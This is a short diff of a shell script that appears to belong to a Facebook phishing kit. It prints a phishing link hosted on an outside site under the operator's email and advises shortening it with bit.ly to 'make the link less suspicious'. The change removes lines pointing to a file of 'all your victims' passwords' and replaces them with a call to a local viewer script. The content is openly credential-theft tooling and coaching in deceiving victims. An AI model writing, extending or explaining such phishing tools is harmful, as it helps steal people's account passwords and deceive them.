@@ -28,7 +28,5 @@ echo "Link: http://clipush.42web.io/fb/$EMAIL/link/"
 echo
 echo "Use link shortener like bit.ly to"
 echo "make the link less suspicious"
-echo
-echo "Visit the link below to see all your victims' passwords:
-echo "Link: http://clipush.42web.io/fb/$EMAIL/pass.txt
+python3 view.py
 exit 0
